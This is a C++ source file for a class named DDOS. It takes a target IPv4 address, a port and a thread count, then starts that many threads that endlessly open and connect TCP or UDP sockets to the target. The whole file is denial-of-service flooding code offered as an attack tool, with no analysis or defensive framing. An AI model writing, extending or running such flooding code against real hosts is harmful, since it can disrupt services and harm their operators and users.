#include "../include/DDOS.hh"

DDOS::DDOS(string target, MAX_SUPER_INT frequency, MIN_SUPER_INT port, bool protocol): target(target), protocol(protocol), port(port), frequency(frequency) {}

bool DDOS::isIPv4() {
  regex IPv4("([0-9]{1,3}.){3}\\.([0-9]{1,3})");
  return (regex_match(this->target, IPv4)) ? true : false;
}

MIN_SUPER_INT DDOS::getPort() {
  return this->port;
}

MAX_SUPER_INT DDOS::getFrequency() {
  return this->frequency;
}

bool DDOS::getProtocol() {
  return (this->protocol) ? SOCK_STREAM : SOCK_DGRAM;
}

void* DDOS::goSocket(void *object) {
  DDOS *mockingSocket = (DDOS *) object;
  while (true) {
    SOCKADDR_IN sin;
    SOCKET sock = socket(AF_INET, mockingSocket->getProtocol(), 0);
    BOOTSTRAP_SOCKET
    sin.sin_addr.s_addr = inet_addr(mockingSocket->target.c_str());
    sin.sin_family = AF_INET;
    sin.sin_port = htons(mockingSocket->getPort());
    connect(sock, (SOCKADDR*)&sin, sizeof(sin));
    BOOTSTRAP_CONNECT
  }
}

void DDOS::attack() {
  if(!this->isIPv4()) {
    BOOTSTRAP_IPV4
    this->~DDOS();
  }

  // TODO:
  // Range ?
  for (MAX_SUPER_INT i = 0; i < this->frequency; i++) {
    this->threads.emplace_back(DDOS::goSocket, this);
  }
}

DDOS::~DDOS() {
  for (auto& t : this->threads) {
      t.join();
  }
  this->threads.clear();
  BOOTSTRAP_THREADS
  exit(0);
}
